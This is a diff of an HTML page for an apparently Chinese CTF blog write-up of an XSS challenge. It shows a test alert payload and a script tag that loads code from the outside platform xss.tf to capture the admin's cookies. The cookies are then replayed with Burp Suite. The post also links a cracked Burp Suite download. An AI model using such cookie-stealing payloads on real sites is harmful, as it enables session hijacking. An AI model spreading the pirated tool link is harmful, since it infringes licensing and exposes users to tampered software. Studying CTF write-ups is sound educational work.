@@ -44,7 +44,7 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190409115611316.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190409115933536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190409120223157.png">
-<meta property="og:updated_time" content="2019-04-09T04:04:11.842Z">
+<meta property="og:updated_time" content="2019-04-09T04:07:42.936Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS 题目解析（上篇）">
 <meta name="twitter:description" content="在开始解题之前先说一下什么是Proof Of Work，一会会用到。Proof Of Work 简称POW中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一">
@@ -216,8 +216,7 @@
 <p>现在问题变成了获取cookies。题目给出了给admin发送message的文本框，自然就想到用XSS获取cookies。</p>
 <p>先试探一下目标有没有设置过滤机制。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/201904091019554.png" alt="在这里插入图片描述"><br>发送成功，我们可以点Click me to view 看一下运行情况。<br><img src="https://img-blog.csdnimg.cn/2019040910211186.png" alt="在这里插入图片描述"><br>看来代码被原样执行了，没有做过滤处理。</p>
-<p>这样获取cookies就很简单了，植入一个自己的Payload就可以了。我使用了一个免费的XSS平台。<a href="http://xss.tf" target="_blank" rel="noopener">http://xss.tf</a><br>创建一个项目使用默认模块就可以。<br><img src="https://img-blog.csdnimg.cn/20190409103543422.png" alt="在这里插入图片描述"><br>配置完成后，在使用界面可以看到使用说明，提供了很多使用方式。</p>
+<p><img src="https://img-blog.csdnimg.cn/201904091019554.png" alt="在这里插入图片描述"><br>发送成功，我们可以点Click me to view 看一下运行情况。<br><img src="https://img-blog.csdnimg.cn/2019040910211186.png" alt="在这里插入图片描述"><br>看来代码被原样执行了，没有做过滤处理。<br><a id="more"></a><br>这样获取cookies就很简单了，植入一个自己的Payload就可以了。我使用了一个免费的XSS平台。<a href="http://xss.tf" target="_blank" rel="noopener">http://xss.tf</a><br>创建一个项目使用默认模块就可以。<br><img src="https://img-blog.csdnimg.cn/20190409103543422.png" alt="在这里插入图片描述"><br>配置完成后，在使用界面可以看到使用说明，提供了很多使用方式。</p>
 <p><img src="https://img-blog.csdnimg.cn/20190409103706460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们选择直接插入script标签的方式。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCrIpt srC=http://xss.tf/GCu&gt;&lt;/sCRipT&gt;</span><br></pre></td></tr></table></figure>
 <p>这里的不规则大小写是为了防止过滤掉script标签，本题经测试可以无视。将代码输入message消息框并提交。<br><img src="https://img-blog.csdnimg.cn/20190409104803299.png" alt="在这里插入图片描述"><br>成功钓到了admin，展开后可以看到cookies。<br><img src="https://img-blog.csdnimg.cn/20190409104945464.png" alt="在这里插入图片描述"><br>接下来就很简单了使用<strong>Burp Suite</strong>修改cookies就可以了。我给出一个永久破解版的<strong>Burp Suite</strong>但是这个版本不是很新，最高只能使用Java 8不过不用注册机破解，已经开启了scanner功能。打开前需要先把时间设置到2017年以前，开启后在恢复时间即可。链接：<a href="https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q</a>   提取码：qun1 </p>
